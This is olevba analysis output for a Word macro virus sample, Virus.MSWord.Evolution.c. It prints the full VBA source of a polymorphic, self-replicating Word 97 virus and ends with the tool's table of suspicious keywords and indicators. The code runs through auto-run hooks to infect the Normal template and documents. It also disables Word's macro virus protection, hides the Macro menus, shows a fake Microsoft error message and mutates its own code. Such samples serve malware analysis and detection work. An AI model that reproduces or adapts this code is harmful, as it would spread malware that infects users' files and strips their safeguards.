olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c-f0dc28019ad7fd5c5cde0005a9f9f26f8f36cb86
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c-f0dc28019ad7fd5c5cde0005a9f9f26f8f36cb86 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UQWU.bas 
in file: Virus.MSWord.Evolution.c-f0dc28019ad7fd5c5cde0005a9f9f26f8f36cb86 - OLE stream: 'Macros/VBA/UQWU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Source As String
 '***< C & A V i r >***
 'Replication System
 'AM
Public ByeMacro As String
 '
 '
 'AM
Public Hostinf As Boolean
 '
Public FileInf As Boolean
 'AM
 '
 'AM
Public FExport As String
Public PMExport As String
 '
 '
Public PMFile_Yes As Boolean
 '
Public Ex_Yes As Boolean
 'Replication System
Public Filename As String
 '***< C & A V i r >***
Public FileID As String
Public FileID2 As String
 '***< C & A V i r >***
Public Virname As String
 '***< C & A V i r >***
 'Replication System
 '***< C & A V i r >***
Public FC_There As Boolean
 'AM
 'Replication System
 'AM
Public FO_There As Boolean
 '
 '***< C & A V i r >***
Public FP_There As Boolean
 '***< C & A V i r >***
Public FN_There As Boolean
 'AM
 'RS
 '
Public FS_There As Boolean
 'AM
 '
Public FSA_There As Boolean
 'AM
 '
Public VrusName As String
 '***< C & A V i r >***
Public Armor As Boolean
 '***< C & A V i r >***
Function Self_Recognition()
 '***< C & A V i r >***
On Error Resume Next
 'RS
 '
Application.EnableCancelKey = wdCancelDisabled
 '
 '
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
 '
Do
 'AM
Line Input #1, Virname
 'AM
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 'AM
 'RS
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
 'AM
 '
 '***< C & A V i r >***
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
 '
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
 '
 'RS
newname:
 '
Close #1
 '
 'AM
Open "C:\windows\system\vnames.cpl" For Append As #1
 '***< C & A V i r >***
 'RS
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
 '
      Close #1
 '
 'Replication System
        End If
 '
 'Replication System
 '
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
 'Replication System
lost:
 'AM
 'RS
Next Z
 '
Loop Until EOF(1)
 '***< C & A V i r >***
Close #1
Dim Lib
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
 'AM
Line Input #1, Virname
 '
 '
 'AM
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
 'AM
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
 'AM
 '
skip:
 '
 'Replication System
Next Lib
 'RS
 'AM
Loop Until EOF(1)
 'Replication System
 '***< C & A V i r >***
doccheck:
Close #1
 '
 '***< C & A V i r >***
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
 '
Do
 '***< C & A V i r >***
Line Input #1, Virname
 '
 '***< C & A V i r >***
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
 '
 '
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
 '***< C & A V i r >***
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
 '***< C & A V i r >***
 'Replication System
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
nope:
 'AM
Next Lib
 '***< C & A V i r >***
 '
Loop Until EOF(1)
 'RS
FileInf = False
leave:
 'Replication System
 '
Close #1
 '
 'Replication System
End Function
 'AM
Function Armor_Status()
 '
 'RS
 '
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
 'RS
Offense:
 '
 'AM
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
 '
Armor = False
 '
 '
 '***< C & A V i r >***
End Function
Function Export_Code()
 '
 '***< C & A V i r >***
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\export.sys")
 '***< C & A V i r >***
 'RS
 '***< C & A V i r >***
If FExport = "Export.sys" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
 'Replication System
 '
Morph:
 '
 'Replication System
Randomize Timer
 '***< C & A V i r >***
 'RS
 'AM
q = Int(Rnd(1) * 5) + 1
 '
 'AM
For vi = 1 To q
x = Int(Rnd(1) * 26)
 'AM
 'Replication System
If x = 1 Then a$ = "A"
 'AM
 '
If x = 2 Then a$ = "B"
 'RS
If x = 3 Then a$ = "C"
 '***< C & A V i r >***
 '
If x = 4 Then a$ = "D"
 'AM
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
 '***< C & A V i r >***
 'RS
 'AM
If x = 7 Then a$ = "G"
 'AM
 'RS
 '
If x = 8 Then a$ = "H"
 'Replication System
 '***< C & A V i r >***
If x = 9 Then a$ = "I"
 '***< C & A V i r >***
 'RS
 'AM
If x = 10 Then a$ = "J"
 '
 '
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 'AM
 '
 'AM
If x = 13 Then a$ = "M"
 'Replication System
 '***< C & A V i r >***
If x = 14 Then a$ = "N"
 '
 'RS
If x = 15 Then a$ = "O"
 '
 'RS
 '***< C & A V i r >***
If x = 16 Then a$ = "P"
 'RS
If x = 17 Then a$ = "Q"
 'RS
 '***< C & A V i r >***
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
 '***< C & A V i r >***
 'Replication System
 'AM
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
 '
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
 'Replication System
If x = 25 Then a$ = "Y"
 '
 'RS
 '***< C & A V i r >***
If x = 26 Then a$ = "Z"
 'RS
 '***< C & A V i r >***
Filename = Filename + a$
 '***< C & A V i r >***
 'Replication System
Next vi
 '
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
' RAPE v1.1 Export File ID Morph
 '
Open "C:\windows\system\Export.sys" For Append As #1
 '***< C & A V i r >***
 'RS
Print #1, FileID
 '
 '
Close #1
 '
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 '***< C & A V i r >***
 'RS
 '***< C & A V i r >***
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 '
 '
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
 'AM
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
 '
 'RS
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 '
Close #1
 'Replication System
 '
nex:
 'Replication System
Next x
 'AM
 '
 '***< C & A V i r >***
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 'AM
If CheckMe = "PMF1199.cpl" Then GoTo nextt
 'AM
Do
 'AM
 '
 '
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
 'AM
Line Input #1, Virname
 'AM
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 '
 'RS
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 '
Loop Until EOF(1)
 '***< C & A V i r >***
 'RS
 '
nextt:
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
Exit Function
 '
 '
Recognize:
 '
Open "C:\windows\system\Export.sys" For Input As #1
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
Line Input #1, FileID
 '***< C & A V i r >***
Close #1
 '
 '***< C & A V i r >***
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
Do
On Error Resume Next
 'AM
 'Replication System
Open "C:\windows\system\vnames.cpl" For Input As #1
 'RS
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 '***< C & A V i r >***
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
 'AM
 'Replication System
tryharder:
 '
 '
 'AM
End Function
 '***< C & A V i r >***
 'RS
Function Polymorphic_Check()
 'AM
 'Replication System
 '***< C & A V i r >***
On Error Resume Next
 'RS
 'AM
Application.EnableCancelKey = wdCancelDisabled
 '
Open FileID2 For Input As #1
 '***< C & A V i r >***
Dim FC_Check
 '***< C & A V i r >***
 'RS
Do
 '
 '
 '***< C & A V i r >***
    Line Input #1, FC_Check
 '
 'RS
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
 '***< C & A V i r >***
Loop Until EOF(1)
FO_Look:
 '***< C & A V i r >***
Dim FO_Check
Do
    Line Input #1, FO_Check
 'AM
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
 '***< C & A V i r >***
Loop Until EOF(1)
 '***< C & A V i r >***
FP_Look:
 'Replication System
 'AM
Dim FP_Check
 'AM
Do
    Line Input #1, FP_Check
 '***< C & A V i r >***
 'Replication System
 '
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
 '
FN_Look:
Dim FN_Check
 'Replication System
 '***< C & A V i r >***
Do
 '
    Line Input #1, FN_Check
 '
 'RS
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
 'RS
Loop Until EOF(1)
 '
FS_Look:
Dim FS_Check
 '***< C & A V i r >***
 'Replication System
 '
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
 '
 'Replication System
 '***< C & A V i r >***
Loop Until EOF(1)
 'AM
 'RS
 'AM
FSA_Look:
 'AM
Dim FSA_Check
 'AM
Do
 '***< C & A V i r >***
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
 '***< C & A V i r >***
 'Replication System
Loop Until EOF(1)
 'RS
End Function
 'AM
 '
 'AM
Function Evolve()
 'AM
 'Replication System
 'AM
On Error Resume Next
 '
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
 '
'RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
 '***< C & A V i r >***
Open "C:\windows\system\Export.sys" For Input As #1
 'AM
 'Replication System
Line Input #1, FileID2
 '***< C & A V i r >***
 'RS
 'AM
Close #1
 '
 'Replication System
PM = Int(Rnd(1) * 150) + 1
 '***< C & A V i r >***
 'Replication System
 'AM
If PM = 22 Then
 '***< C & A V i r >***
If FC_There = True Then Exit Function
 'RS
 'AM
Open FileID2 For Append As #1
 'RS
Print #1, "Sub FileClose()"
 'AM
Print #1, "On error resume next"
 '
 'AM
Print #1, "Call Evolution"
 '***< C & A V i r >***
Print #1, "Wordbasic.FileSave"
 '***< C & A V i r >***
Print #1, "End Sub"
Close #1
 '***< C & A V i r >***
End If
 'AM
 'RS
 'AM
If PM = 73 Then
 '
 'RS
 '
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
 'AM
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
 'RS
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Evolution"
 '***< C & A V i r >***
 '
 '
Print #1, "end sub"
Close #1
 '
End If
 'AM
 '
 '***< C & A V i r >***
If PM = 69 Then
If FP_There = True Then Exit Function
 'Replication System
 '
Open FileID2 For Append As #1
Print #1, "Sub FilePrint()"
 '
 '***< C & A V i r >***
Print #1, "on error resume next"
 '
 '
Print #1, "Dialogs(wdDialogFilePrint)"
 '
Print #1, "Call Evolution"
 'RS
Print #1, "End sub"
 '***< C & A V i r >***
 '
 'AM
Close #1
 '
 'Replication System
 '***< C & A V i r >***
End If
 'AM
 'Replication System
 'AM
If PM = 122 Then
 '
 '
If FN_There = True Then Exit Function
 'Replication System
 '
Open FileID2 For Append As #1
 '
 'AM
Print #1, "Sub FileNew()"
 '***< C & A V i r >***
 'RS
Print #1, "on error resume next"
 '
 '
 '
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Evolution"
 '
Print #1, "End Sub"
 '
 '
Close #1
 'Replication System
 '
End If
 '
 '***< C & A V i r >***
If PM = 90 Then
 '***< C & A V i r >***
 'Replication System
If FS_There = True Then Exit Function
Open FileID2 For Append As #1
 '***< C & A V i r >***
Print #1, "Sub FileSave()"
 '
 '***< C & A V i r >***
Print #1, "on error resume next"
Print #1, "call Evolution"
 '***< C & A V i r >***
Print #1, "wordbasic.filesave"
 '
Print #1, "end sub"
Close #1
 '
 'Replication System
End If
 '
If PM = 8 Then
If FSA_There = True Then Exit Function
 '
 '
 '***< C & A V i r >***
Open FileID2 For Append As #1
 'RS
Print #1, "Sub FileSaveAs()"
 '***< C & A V i r >***
Print #1, "on error resume next"
 'Replication System
 '***< C & A V i r >***
Print #1, "Dialogs(wdDialogFileSaveAs)"
 'AM
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
 '
End Function
 'AM
 'RS
Function Norminf()
 'Replication System
 '
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 '***< C & A V i r >***
Open "C:\windows\system\Export.sys" For Input As #1
 'AM
 'Replication System
 '***< C & A V i r >***
Line Input #1, FileID2
 'Replication System
 '
Close #1
 '
 '
 '
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Replication System
 'AM
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
 '
 '
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
 '
 '
        Open "C:\windows\system\vnames.cpl" For Append As #1
 '
 '
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
 '
        Close #1
 '
        End If
 '
 'Replication System
nexus:
 '
 '
 '***< C & A V i r >***
    Next l
 '***< C & A V i r >***
 '
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
 '
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
End Function
 '
 'RS
Function FileInft()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
 'AM
 '
 'AM
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
 '***< C & A V i r >***
Close #1
 'AM
 '
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
 'AM
 'Replication System
End With
 'AM
 'RS
Randomize Timer
 'RS
WD = Int(Rnd(1) * 8) + 2
 '
 'RS
 '
For evo = 2 To WD
 'RS
x = Int(Rnd(1) * 26)
 '***< C & A V i r >***
 'RS
If x = 1 Then a$ = "A"
 '***< C & A V i r >***
 'Replication System
 '***< C & A V i r >***
If x = 2 Then a$ = "B"
 '***< C & A V i r >***
 'RS
 'AM
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
 'Replication System
 '***< C & A V i r >***
If x = 5 Then a$ = "E"
 '***< C & A V i r >***
 'Replication System
 'AM
If x = 6 Then a$ = "F"
 '
 '
If x = 7 Then a$ = "G"
 '
 'AM
If x = 8 Then a$ = "H"
 '
 '***< C & A V i r >***
If x = 9 Then a$ = "I"
 'AM
 'RS
 '
If x = 10 Then a$ = "J"
 'AM
If x = 11 Then a$ = "K"
 'Replication System
If x = 12 Then a$ = "L"
 'Replication System
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
 'RS
 '
If x = 15 Then a$ = "O"
 '
 'AM
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
 '
 'RS
If x = 18 Then a$ = "R"
 '
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
 'AM
If x = 21 Then a$ = "U"
 'RS
 'AM
If x = 22 Then a$ = "V"
 '***< C & A V i r >***
 '
If x = 23 Then a$ = "W"
 'RS
 '***< C & A V i r >***
If x = 24 Then a$ = "X"
 'Replication System
If x = 25 Then a$ = "Y"
 '***< C & A V i r >***
 '
 'AM
If x = 26 Then a$ = "Z"
 'Replication System
VrusName = VrusName + a$
Next evo
 '
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 'AM
 'Replication System
Do
 '
 '
Line Input #1, Virname
 'RS
 '
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
 'RS
 '***< C & A V i r >***
' RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
 'RS
Close #1
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
 '
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 '
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
 '
rite:
 '
 'Replication System
Open "C:\windows\system\vnames.cpl" For Append As #1
 '
 '***< C & A V i r >***
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 '
 'Replication System
 '
Close #1
nex:
Next x
 'Replication System
 'AM
End Function
 '
 'RS
Function Evolution()
 'AM
On Error Resume Next
 'Replication System
 '
Application.EnableCancelKey = wdCancelDisabled
 'AM
Call Self_Recognition
 '***< C & A V i r >***
 'Replication System
 '***< C & A V i r >***
Call Armor_Status
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
Call Export_Code
 'AM
 'RS
Call Polymorphic_Check
Call Evolve
If Hostinf = False Then Call Norminf
 '
If FileInf = False Then Call FileInft
 'Replication System
Options.VirusProtection = False
 '***< C & A V i r >***
 'Replication System
 '***< C & A V i r >***
Options.ConfirmConversions = False
 'AM
 'RS
 '***< C & A V i r >***
Options.SaveNormalPrompt = False
 '
 'Replication System
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'AM
' W97M/Evolution
 '***< C & A V i r >***
' W97M/Evolution .a Variant by Nex and Error
 '***< C & A V i r >***
' Polymorphic Stealth Word97 Macro Virus
 '
' All Things Must Change...
 '***< C & A V i r >***
 'RS
 '***< C & A V i r >***
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error
 'AM
 '
 '
' RAPE v1.1 does:
' Randomly Morphs Source Code by Adding Random Remarks
 'AM
 'RS
' Randomly Selects Source Code Export File - Then Morphs it
 '
 'AM
' Randomly Creates Virus Macro Name
 '
' Randomly Adds 1 to 6 Commands to Code
 'AM
End Function
Sub AutoClose()
 '***< C & A V i r >***
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'RS
 '
Call Evolution
 '
 'AM
WordBasic.filesave
 '***< C & A V i r >***
 'RS
 '
End Sub
 'AM
 'Replication System
Sub AutoExec()
 'AM
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 '
 'Replication System
 '
Call Armor_Status
Options.VirusProtection = False
 '***< C & A V i r >***
 'Replication System
 'AM
Options.ConfirmConversions = False
 'RS
 '
Options.SaveNormalPrompt = False
 'RS
 '***< C & A V i r >***
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
 '***< C & A V i r >***
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'Replication System
End Sub
 'AM
Sub AutoExit()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
 'RS
 'AM
Call Evolution
 '
 '
 '
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
 '
 'Replication System
 '
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
If PMFile_Yes = True Then Exit Sub
 'AM
 'Replication System
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
Print #1, "W97M/Evolution .a by Nex"
 '
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
 '
 '
 '
Close #1
 'AM
Open "C:\windows\system\Export.sys" For Input As #2
 'Replication System
 '***< C & A V i r >***
Line Input #2, FileID
 '***< C & A V i r >***
 'Replication System
Close #2
 'AM
 'RS
 'AM
Open FileID For Append As #9
 'RS
 'AM
Print #9, "' EOF"
 '
Close #9
 '
Open FileID For Input As #3
 'AM
Randomize Timer
 '
W = Int(Rnd(1) * 5) + 1
 '***< C & A V i r >***
For vir = 1 To W
 '***< C & A V i r >***
x = Int(Rnd(1) * 26)
 '
 'RS
If x = 1 Then a$ = "A"
 '
 '
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
 '
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
 'AM
 'RS
If x = 6 Then a$ = "F"
 'AM
 'RS
 '
If x = 7 Then a$ = "G"
 '
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
 '
 '
If x = 10 Then a$ = "J"
 '
 '
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 'Replication System
 '***< C & A V i r >***
If x = 13 Then a$ = "M"
 'AM
If x = 14 Then a$ = "N"
 '
If x = 15 Then a$ = "O"
 '
If x = 16 Then a$ = "P"
 '
 '
 'AM
If x = 17 Then a$ = "Q"
 '
If x = 18 Then a$ = "R"
 '
 '
If x = 19 Then a$ = "S"
 '***< C & A V i r >***
 'RS
 'AM
If x = 20 Then a$ = "T"
 '***< C & A V i r >***
 'RS
If x = 21 Then a$ = "U"
 '
 '
 '
If x = 22 Then a$ = "V"
 '
If x = 23 Then a$ = "W"
 'RS
 'AM
If x = 24 Then a$ = "X"
 '
 'RS
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
 '
 '
 '
Filename = Filename + a$
 '
 '
Next vir
 '
 'RS
 '
F = Int(Rnd(1) * 999) + 1
 'Replication System
 '
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
 '***< C & A V i r >***
Open FileID2 For Append As #4
 '***< C & A V i r >***
 'RS
Do
 '
 'Replication System
inpux:
Line Input #3, stuff
 '
 '
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
    If t = 1 Then Z$ = " '" & Application.UserName
 'AM
    If t = 2 Then Z$ = " '" & Application.UserInitials
 'AM
 'Replication System
    If t = 3 Then Z$ = " '" & Application.UserAddress
 '***< C & A V i r >***
    If t >= 4 Then GoTo inpux
 'AM
    Print #4, Z$
 '
 'AM
' Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)
 '
 'AM
Loop Until stuff = "' EOF"
 'Replication System
Close #3
 'RS
 '
Close #4
 '
 '
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
 '***< C & A V i r >***
 'RS
Print #5, FileID2
 '***< C & A V i r >***
Close #5
 '***< C & A V i r >***
 '
 '***< C & A V i r >***
End Sub
 'AM
Sub AutoNew()
 'Replication System
On Error Resume Next
 '***< C & A V i r >***
Application.EnableCancelKey = wdCancelDisabled
 '***< C & A V i r >***
Call Evolution
 'AM
End Sub
Sub AutoOpen()
 '
On Error Resume Next
 'RS
 'AM
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
 '***< C & A V i r >***
Call Evolution
 'AM
 'RS
 '
End Sub
 'AM
 'RS
Sub FileTemplates()
 'RS
Application.EnableCancelKey = wdCancelDisabled
 '
End Sub
Sub ToolsCustomize()
 '
Application.EnableCancelKey = wdCancelDisabled
 'RS
 'AM
End Sub
 'RS
 '
Sub ToolsMacro()
 '
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
End Sub
 'AM
Sub ViewVBCode()
 'RS
 'AM
Application.EnableCancelKey = wdCancelDisabled
 '***< C & A V i r >***
End Sub
 'RS
' "The most polymorphic Macro Virus to date...." - NAI
 '***< C & A V i r >***
 '
' EOF

 '***< C & A V i r >***
' EOF
 'AM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

